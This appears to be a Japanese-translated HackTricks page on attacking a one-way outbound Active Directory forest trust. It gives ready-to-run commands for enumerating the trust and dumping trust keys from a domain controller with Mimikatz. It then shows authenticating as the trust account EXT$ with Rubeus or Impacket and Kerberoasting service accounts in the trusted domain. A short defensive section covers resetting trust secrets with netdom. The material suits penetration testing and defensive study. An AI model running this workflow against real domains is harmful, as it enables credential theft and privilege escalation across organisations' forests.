# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

このシナリオでは、**your domain** が、**different domain/forest** のプリンシパルに対して、何らかの **privileges** を**信頼**しています。

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
AD module が利用可能な場合は、**Trusted Domain Object (TDO)** も直接調査します。これにより、後で簡単な経路が **FSP/group abuse** なのか **trust-account abuse** なのかを判断する際に必要となる、生の LDAP ベースの trust データを取得できます：
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
また、`CN=ForeignSecurityPrincipals` の foreign principals に対して、実際にどこで access が granted されているかも列挙する必要があります。よくある例は次のとおりです。

- 現在の domain 内の server/DC における **Local admin**
- users/computers/GPOs に対する ACL を持つ **custom domain group** のメンバーシップ
- **computer objects** を変更する権限。trust configuration が許可している場合、後から [RBCD](resource-based-constrained-delegation.md) につながる可能性があります

## Trust Account Attack

domain/forest **B** から domain/forest **A** への one-way trust（**B trusts A**）が作成されると、**B** 用の **trust account** が **A** 内に作成されます。**A** の outbound-trust view では、後から **B**（trusting side）を compromise した場合に、そこで trust secret を dump し、`B$` として **A** に対して authenticate できるため、これは有用です。<sup>[[1]](#references)</sup>

ここで理解しておくべき重要な点は、この trust account の password と Kerberos material は、**trusting** domain 内の Domain Controller から、次の方法で extract できることです。<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
これは、**trusted** domain に作成された trust account が有効な principal であり、そのドメイン内の通常の domain user と同等の基本権限を持つためです。これだけで LDAP の enumeration を開始し、tickets を要求し、次の escalation path を見つけるには十分なことがよくあります。<sup>[[1]](#references)</sup>

`ext.local` が **trusting** domain で、`root.local` が **trusted** domain の場合、`root.local` 内に `EXT$` という名前の user account が作成されます。`ext.local` から trust keys を dump すると、`root.local` に対して `root.local\EXT$` として使用できる credentials が明らかになります。<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
これに続いて、抽出した **RC4** key を使用し、`root.local` 内で `root.local\EXT$` として authenticate します。<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
次に、そのプリンシパルとして trusted domain を列挙します。たとえば、`root.local` 内の価値の高い SPN に対して Kerberoasting を実行します。<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linuxから

**RC4** trust-account keyを取得できた場合、LinuxからもImpacketを使用して同じ方法が機能します。
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
`**RC4**` が受け入れられない場合は、取得した **cleartext password**（または導出した **AES** keys）にフォールバックし、その foothold から通常の [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) および [Kerberoast](kerberoast.md) workflows を再利用します。

### Key material gotchas

**trust keys** と **trust-account credentials** を混同しないでください:<sup>[[1]](#references)</sup>

- one-way trust では、双方が **TDO** を保存しますが、実際の **`EXT$` user account** は trusted domain にのみ存在します。
- 現在の trust-account password は、TDO の trust secret（`NewPassword` / current trust key）に反映されます。
- **RC4** trust key は、trust account として `asktgt` で再利用するのに最も簡単な artifact です。default setup では、trust account の `msDS-SupportedEncryptionTypes` が空であることが多いため、通常はこれが動作する enctype です。
- **AES trust keys** について考える場合、それらは trust-account AES keys と interchangeable ではないことに注意してください。salt が異なるためです。

そのため、このページの technique では、dump された **RC4** material または取得した **cleartext** password のいずれかを優先してください。<sup>[[1]](#references)</sup>

### Gathering cleartext trust password

前の flow では、**cleartext password** の代わりに trust hash を使用していました（この **cleartext password** も **mimikatz** によって **dumped** されます）。<sup>[[1]](#references)</sup>

cleartext password は、mimikatz の \[ CLEAR ] output を hexadecimal から変換し、null bytes `\x00` を削除することで取得できます:<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: cleartext password は、mimikatz の ( CLEAR ) output を hexadecimal から変換し、null...](<../../images/image (938).png>)

trust relationship の作成時に、trust 用の password を user が入力しなければならない場合があります。この demonstration では、key は元の trust password であるため、人間が読める形式です。key が rotate されると（default: 30 日ごと）、cleartext は通常、人間が読める形式ではなくなりますが、技術的には引き続き使用できます。<sup>[[1]](#references)</sup>

cleartext password は、trust account の Kerberos secret key を使用して TGT を request する代わりに、trust account として通常の authentication を実行するために使用できます。ここでは、`ext.local` から `root.local` に対して `Domain Admins` の members を query しています:<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: cleartext password は、TGT を request する代わりに trust account として通常の authentication を実行するために使用できます...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts は扱いにくい principals です。**RUNAS / console / RDP** などの interactive logons はここで想定される path ではなく、**NTLM** authentication attempts は `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` で失敗する可能性があります。代わりに **Kerberos network logons**（`asktgt`、LDAP、CIFS、Kerberoast）を計画してください。<sup>[[1]](#references)</sup>

### Persistence / cleanup note

defenders が trusting domain が compromised されたことを認識した場合、`netdom trust ... /resetOneSide ...` を使用して、**both sides** の trust secret を rotate する必要があります。operator の観点では、**manual reset は old trust material を直ちに無効化する**一方、通常の trust-password rotation では rollover 中に current/previous values が保持されるため、この点が重要です。<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## 参考資料

- [1] [ドメイン間のセキュリティ境界としてのSID filter？（Part 7）– Trust account attack – trustingからtrustedへ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Trust passwordのリセット](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
